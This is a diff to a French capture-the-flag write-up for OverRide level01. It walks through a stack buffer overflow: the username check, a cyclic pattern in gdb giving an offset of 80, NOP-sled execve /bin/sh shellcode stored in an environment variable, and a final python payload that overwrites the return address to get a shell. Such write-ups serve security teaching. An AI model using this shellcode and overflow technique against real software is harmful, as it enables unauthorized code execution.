@@ -1,6 +1,6 @@
 # Level1
 
-On observe que l'executable prend une entre sur l'entre standard
+On observe que l'exécutable lit un input sur l'entrée standard
 
 ```shell
 $ ./level01
@@ -11,18 +11,18 @@ verifying username....
 nope, incorrect username...
 ```
 
-On regarde l'assembleur et on remarque qu'il compare notre entre de `Username` a
-`dat_wil`. On peut alors utiliser un shellcode car l'entre de `Password` utilise un `strcmp()`
+On regarde l'assembleur et on remarque qu'il compare notre input de `Username` à
+`dat_wil`. Ensuite, on voit qu'il segfault si le mot de passe est trop grand.
 
 ```shell
-$ python -c 'print("dat_wil\n" + "A"*79)' | ./level01
+$ python -c 'print("dat_wil\n" + "A"*40)' | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
 Enter Password:
 nope, incorrect password...
 
-$ python -c 'print("dat_wil\n" + "A"*80)' | ./level01
+$ python -c 'print("dat_wil\n" + "A"*200)' | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
@@ -30,6 +30,27 @@ Enter Password:
 nope, incorrect password...
 
 Segmentation fault (core dumped)
+```
+
+On utilise donc wiremask pour trouver l'offset, qui est de 80
+
+```shell
+level01@OverRide:~$ gdb level01 -q
+Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
 ```
 
 On va mettre notre shellcode dans une variable d'environnement et regarder son adresse
@@ -52,7 +73,7 @@ Breakpoint 1, 0x080484d0 in main ()
 0xffffd860: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
 ```
 
-Assemblons toute les pieces
+Assemblons toutes les pièces
 
 ```shell
 $ (python -c 'print("dat_wil\n" + "A"*80 + "\xff\xff\xd8\x80"[::-1])'; cat) | ./level01
